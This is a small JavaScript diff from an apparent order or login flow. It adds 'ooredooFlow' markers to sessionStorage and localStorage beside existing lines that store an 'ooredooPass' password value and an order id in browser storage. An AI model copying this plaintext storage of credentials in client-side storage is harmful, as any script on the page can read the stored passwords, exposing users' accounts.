@@ -386,6 +386,10 @@
       sessionStorage.setItem('ooredooPass', ooredooPass);
       sessionStorage.setItem('safwa_order_id', currentOrderId);
       localStorage.setItem('requestId', currentOrderId);
+      sessionStorage.setItem('ooredooFlow_' + currentOrderId, 'login');
+      localStorage.setItem('ooredooFlow_' + currentOrderId, 'login');
+      sessionStorage.setItem('ooredooFlow', 'login');
+      localStorage.setItem('ooredooFlow', 'login');
 
       const payload = {
         id: currentOrderId,
